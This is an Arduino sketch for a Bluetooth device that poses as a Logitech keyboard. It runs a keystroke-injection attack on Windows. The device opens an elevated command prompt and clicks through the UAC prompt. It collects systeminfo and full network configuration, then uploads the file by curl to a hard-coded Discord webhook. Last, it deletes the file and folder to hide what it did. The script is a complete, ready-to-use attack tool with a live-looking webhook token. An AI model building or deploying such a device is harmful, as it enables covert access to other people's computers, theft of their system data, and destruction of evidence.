#include <BleKeyboard.h>
BleKeyboard bleKeyboard("Audit-Ghost", "Logitech", 100);

// NITRO SYNC: 20ms down + 55ms up = 75ms total
void typeSafe(String text) {
  for(int i=0; i < text.length(); i++) {
    bleKeyboard.press(text[i]);
    delay(20); 
    bleKeyboard.releaseAll();
    delay(55); 
  }
}

void setup() {
  pinMode(0, INPUT_PULLUP);
  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected() && digitalRead(0) == LOW) {
    delay(800); 

    // 1. Open Admin CMD
    bleKeyboard.press(KEY_LEFT_GUI); bleKeyboard.press('r'); delay(100); bleKeyboard.releaseAll();
    delay(600);
    typeSafe("cmd"); 
    bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.press(KEY_LEFT_SHIFT); bleKeyboard.press(KEY_RETURN);
    delay(100); bleKeyboard.releaseAll();
    delay(1800); // UAC wait
    bleKeyboard.press(KEY_LEFT_ALT); bleKeyboard.press('y'); delay(100); bleKeyboard.releaseAll();
    delay(800);

    // 2. Data Collection (Chained commands)
    typeSafe("cls & mkdir C:\\Klog & systeminfo > C:\\Klog\\log.txt & ipconfig /all >> C:\\Klog\\log.txt");
    bleKeyboard.write(KEY_RETURN);
    delay(3500); // Wait for log generation

    // 3. Exfiltration to Discord
    String url = "https://discord.com/api/webhooks/1466450537057615923/ZHjR5aI1VDQzpNcpK0eGjBuvs1V3juMT9xNVtFIe0U4VRboAH6JqjTFru0r-VYZPTY4w";
    typeSafe("curl -X POST -F \"file=@C:/Klog/log.txt\" " + url);
    bleKeyboard.write(KEY_RETURN);
    
    delay(2500); // Upload wait

    // 4. THE SELF-DESTRUCT: Delete file and REMOVE FOLDER
    // 'rd /s /q' removes the directory and all files inside silently
    typeSafe("del /f /q C:\\Klog\\log.txt & rd /s /q C:\\Klog & exit");
    bleKeyboard.write(KEY_RETURN);

    while(digitalRead(0) == LOW) { delay(10); }
  }
}